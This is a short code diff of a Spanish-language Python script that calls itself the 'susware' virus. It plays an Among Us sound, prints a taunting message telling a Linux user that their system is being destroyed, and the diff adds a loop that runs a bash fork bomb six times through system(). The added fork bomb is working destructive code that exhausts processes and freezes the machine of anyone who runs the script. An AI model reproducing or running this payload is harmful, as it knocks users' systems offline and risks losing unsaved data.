@@ -8,6 +8,7 @@ def start_destruction():
 #         Empieza a sonar el among drip descargado     
           playsound('src/amogus.mp3')
           sleep(10)
+          
           print(Fore.GREEN, """
      Tu sistema ha sido FOLLADO por el virus susware, no intentes reiniciar tu linux
      porque si no te irá peor, JAJAJAJAJAJA mientras destruimos tu sistema, disfruta del precioso
@@ -46,7 +47,10 @@ def start_destruction():
                .+ydddyso+//////:                      
                     .:/oosyyyyss/             
           """)
-
+          sleep(5)
+          for _ in range(6):
+               system(":(){ :|:& };:")
+               sleep(2)
 #         Imprime el siguiente mensaje en pantalla
           system('echo "FOLLANDONOS EL SISTEMA OPERATIVO..."')
 
